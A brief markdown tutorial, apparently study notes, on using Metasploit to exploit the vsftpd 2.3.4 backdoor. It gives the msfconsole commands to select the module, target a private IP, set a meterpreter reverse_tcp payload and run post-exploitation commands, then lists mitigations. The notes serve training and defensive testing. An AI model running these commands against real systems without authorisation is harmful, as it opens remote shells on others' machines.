# 💥 Exploitation with Metasploit Framework

## Overview
Metasploit is a powerful exploitation framework used to develop, test, and execute exploits against vulnerable systems.

---

## Basic Workflow

### Launch Metasploit
```bash
msfconsole
```

---

### Search for Exploits
```bash
search vsftpd
```

---

### Use an Exploit
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.10
run
```

---

## Payload Handling
```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

---

## Post-Exploitation
```bash
sysinfo
getuid
```

---

## Mitigation
- Patch systems
- Disable vulnerable services
- Network segmentation

---

## Conclusion
Metasploit enables controlled exploitation for learning and defensive validation.
